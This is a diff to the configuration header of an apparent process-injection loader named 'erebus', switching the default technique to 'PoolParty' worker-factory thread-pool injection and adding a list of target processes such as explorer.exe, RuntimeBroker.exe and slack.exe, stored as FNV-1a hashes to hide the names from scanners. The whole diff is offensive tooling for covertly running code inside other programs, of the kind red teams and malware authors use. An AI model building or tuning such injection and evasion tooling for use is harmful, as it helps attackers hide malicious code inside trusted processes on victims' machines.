@@ -58,7 +58,6 @@
 
 // Target process for remote injection
 #ifndef CONFIG_TARGET_PROCESS
-#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe\0"
 #endif
 
 // Injection technique:
@@ -68,15 +67,34 @@
 // 4 = EarlyCascade        - Early Bird APC injection (Remote)
 // 5 = PoolParty           - Worker Factory thread pool injection (Remote)
 #ifndef CONFIG_INJECTION_TYPE
-#define CONFIG_INJECTION_TYPE 1
+#define CONFIG_INJECTION_TYPE 5
 #endif
 
-#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 4 || CONFIG_INJECTION_TYPE == 5
-#define CONFIG_INJECTION_MODE 1  // Remote injection
+#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 2 || CONFIG_INJECTION_TYPE == 4
+#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
+#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
 #elif CONFIG_INJECTION_TYPE == 3
 #define CONFIG_INJECTION_MODE 2  // Self injection
-#else
-#define CONFIG_INJECTION_MODE 1  // Remote injection (default)
+#elif  CONFIG_INJECTION_TYPE == 5
+#define CONFIG_TARGET_PROCESS \
+            erebus::HashStringFowlerNollVoVariant1a("RuntimeBroker.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("fontdrvhost.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("dllhost.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("Spotify.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("slack.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("SteelSeriesGG.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("GoogleDriveFS.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("steamwebhelper.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("slpwow64.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("sihost.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("msiexec.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("WerFault.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("werfault.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("devenv.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("cloudflared.exe"), \
+            erebus::HashStringFowlerNollVoVariant1a("explorer.exe")
+#define CONFIG_INJECTION_MODE 3  // Remote injection (Inject into existing process)
 #endif
 
 #if CONFIG_INJECTION_TYPE == 1
